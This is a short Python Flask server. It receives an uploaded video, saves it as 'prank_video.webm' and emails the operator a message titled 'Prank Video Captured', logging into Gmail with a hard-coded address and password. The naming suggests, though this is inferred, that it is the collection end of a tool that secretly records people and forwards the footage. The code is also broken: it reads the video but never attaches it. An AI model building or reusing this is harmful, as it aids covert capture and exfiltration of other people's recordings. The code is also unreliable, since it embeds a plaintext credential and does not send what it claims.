from flask import Flask, request
import smtplib
import os

app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload_video():
    if 'video' not in request.files:
        return "No file found", 400

    file = request.files['video']
    filepath = os.path.join(UPLOAD_FOLDER, "prank_video.webm")
    file.save(filepath)

    send_email(filepath)
    return "Video received and sent!", 200

def send_email(filepath):
    sender_email = "checker.checker.checker.111@gmail.com"
    receiver_email = "checker.checker.checker.111@gmail.com"
    password = "checker@123"

    with open(filepath, "rb") as video_file:
        video_data = video_file.read()

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, password)

    subject = "Prank Video Captured"
    body = "Here is the recorded video."
    message = f"Subject: {subject}\n\n{body}"

    server.sendmail(sender_email, receiver_email, message)
    server.quit()

if __name__ == '__main__':
    app.run(debug=True, port=5000)
